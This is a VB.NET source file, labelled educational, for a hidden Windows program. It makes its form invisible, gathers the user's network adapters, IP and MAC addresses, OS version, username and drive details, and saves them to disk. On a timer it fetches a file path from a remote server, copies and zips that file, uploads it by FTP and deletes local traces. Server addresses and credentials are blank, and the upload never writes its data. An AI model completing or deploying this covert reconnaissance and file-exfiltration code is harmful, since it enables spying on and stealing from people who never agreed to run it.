'﻿'Copyright 2023 Elliot M - Developer and security researcher.
''For educational purposes only. Do not use or reproduce without the explicit written consent from the original owner.

Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Reflection
Imports System.Text
Imports System.Windows.Forms.VisualStyles.VisualStyleElement

Public Class Form1

    Dim filePath As String
    Dim copyStat As String
    Dim packStat As String

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Visible = False
        filePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)
        Dim inFolderPath As String = filePath + "\In"
        Dim outFolderPath As String = filePath + "\Out"
        If Not Directory.Exists(inFolderPath) Then
            Directory.CreateDirectory(inFolderPath)
        End If
        If Not Directory.Exists(outFolderPath) Then
            Directory.CreateDirectory(outFolderPath)
        End If
        Dim directorDelete1 As String = filePath + "\In"
        For Each deleteFile In Directory.GetFiles(filePath + "\In", "*.min*", SearchOption.TopDirectoryOnly)
            File.Delete(deleteFile)
        Next
        Dim directorDelete2 As String = filePath + "\Out"
        For Each deleteFile In Directory.GetFiles(filePath + "\Out", "*.zip*", SearchOption.TopDirectoryOnly)
            File.Delete(deleteFile)
        Next
        Dim directorDelete3 As String = filePath + "\Out"
        For Each deleteFile In Directory.GetFiles(filePath + "\Out", "*.txt*", SearchOption.TopDirectoryOnly)
            File.Delete(deleteFile)
        Next
        Dim nics As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
        Dim sb As New StringBuilder()
        For Each adapter As NetworkInterface In nics
            sb.AppendLine($"Name: {adapter.Name}")
            sb.AppendLine($"Description: {adapter.Description}")
            sb.AppendLine($"ID: {adapter.Id}")
            sb.AppendLine($"Speed: {adapter.Speed}")
            sb.AppendLine($"Status: {adapter.OperationalStatus}")
            sb.AppendLine($"MAC address: {adapter.GetPhysicalAddress()}")
            sb.AppendLine($"IP address:")

            Dim properties As IPInterfaceProperties = adapter.GetIPProperties()
            For Each address As IPAddressInformation In properties.UnicastAddresses
                sb.AppendLine($"  {address.Address}")
            Next
            sb.AppendLine()
        Next
        TextBox7.Text = sb.ToString()
        Dim os As OperatingSystem = Environment.OSVersion
        Dim osVersionString As String = os.VersionString.ToString()
        TextBox6.Text = "Operating system: " + osVersionString
        TextBox4.Text = "User account: " + Environment.UserName.ToString
        For Each drive As DriveInfo In DriveInfo.GetDrives()
            Dim freeSpace As Double = drive.TotalFreeSpace
            Dim totalSpace As Double = drive.TotalSize
            Dim percentFree As Double = (freeSpace / totalSpace) * 100
            Dim num As Single = CSng(percentFree)
            TextBox8.AppendText("Drive name: " & drive.Name & " with " & num & "% available." & Environment.NewLine)
            TextBox8.AppendText("Space available: " & drive.AvailableFreeSpace & Environment.NewLine)
            TextBox8.AppendText("Space used: " & drive.TotalSize & Environment.NewLine)
            TextBox8.AppendText("Drive type: " & drive.DriveType.ToString() & Environment.NewLine)
            TextBox8.AppendText("")
        Next
        Dim uptime As TimeSpan = TimeSpan.FromMilliseconds(Environment.TickCount)
        Dim milliseconds As Integer = uptime.Milliseconds
        TextBox5.Text = "Time since login: " & milliseconds & " milliseconds." & Environment.NewLine
        Using writer As New System.IO.StreamWriter(filePath + "\Out\data.txt")
            writer.WriteLine(TextBox4.Text)
            writer.WriteLine(TextBox5.Text)
            writer.WriteLine(TextBox6.Text)
            writer.WriteLine(TextBox7.Text)
            writer.WriteLine(TextBox8.Text)
        End Using
    End Sub

    Private Sub Time1_Tick(sender As Object, e As EventArgs) Handles Time1.Tick
        If TextBox4.Text <> String.Empty Then
            Dim client As WebClient = New WebClient()
            TextBox1.Text = client.DownloadString("")
            If TextBox1.Text = String.Empty Then
                Try
                    Dim fCon As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(""), System.Net.FtpWebRequest)
                    fCon.Credentials = New System.Net.NetworkCredential("", "")
                    fCon.Method = System.Net.WebRequestMethods.Ftp.UploadFile
                    Dim fFile() As Byte = System.IO.File.ReadAllBytes(filePath + "\Out\data.txt")
                    Dim fStream As System.IO.Stream = fCon.GetRequestStream()
                    TextBox9.Text = "Transfer complete: " + filePath + "\Out\data.txt"
                    For Each deleteFile In Directory.GetFiles(filePath + "\Out", "*.txt*", SearchOption.TopDirectoryOnly)
                        File.Delete(deleteFile)
                    Next
                    Time1.Equals(30000)
                Catch ex As Exception
                    TextBox9.Text = ex.Message
                End Try
            Else
                For Each deleteFile In Directory.GetFiles(filePath + "\In", "*.min*", SearchOption.TopDirectoryOnly)
                    File.Delete(deleteFile)
                Next
                Dim directorDelete2 As String = filePath + "\Out"
                For Each deleteFile In Directory.GetFiles(filePath + "\Out", "*.zip*", SearchOption.TopDirectoryOnly)
                    File.Delete(deleteFile)
                Next
                Dim sourceFile As String = TextBox1.Text
                Dim destinationFile1 As String = filePath + "\In\data.min"
                Try
                    File.Copy(sourceFile, destinationFile1)
                    TextBox2.Text = "Copy complete: " & destinationFile1
                    Clipboard.Clear()
                Catch ex As Exception
                    TextBox2.Text = ex.Message
                    Clipboard.Clear()
                    Dim directorDelete As String = filePath + "\Out"
                    For Each deleteFile In Directory.GetFiles(filePath + "\Out", "*.zip*", SearchOption.TopDirectoryOnly)
                        File.Delete(deleteFile)
                    Next
                End Try
                If File.Exists(filePath + "\In\data.min") Then
                    Dim sourceFolder As String = filePath + "\In"
                    Dim destinationFile2 As String = filePath + "\Out\package.zip"
                    Try
                        ZipFile.CreateFromDirectory(sourceFolder, destinationFile2)
                        TextBox3.Text = "Package complete: " & destinationFile2
                        Dim sourceFolder1 As String = filePath + "\In"
                        Dim destinationFile3 As String = filePath + "\Out\package.zip"
                        Dim fCon As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(""), System.Net.FtpWebRequest)
                        fCon.Credentials = New System.Net.NetworkCredential("", "")
                        fCon.Method = System.Net.WebRequestMethods.Ftp.UploadFile
                        Dim fFile() As Byte = System.IO.File.ReadAllBytes(filePath + "\Out\package.zip")
                        Dim fStream As System.IO.Stream = fCon.GetRequestStream()
                        TextBox9.Text = "Transfer complete: " + filePath + "\Out\package.zip"
                    Catch ex As Exception
                        TextBox3.Text = ex.Message
                        TextBox9.Text = ex.Message
                    End Try
                Else
                    TextBox3.Text = TextBox2.Text
                End If
            End If
        Else
            Time1.Equals(30000)
        End If
    End Sub
End Class
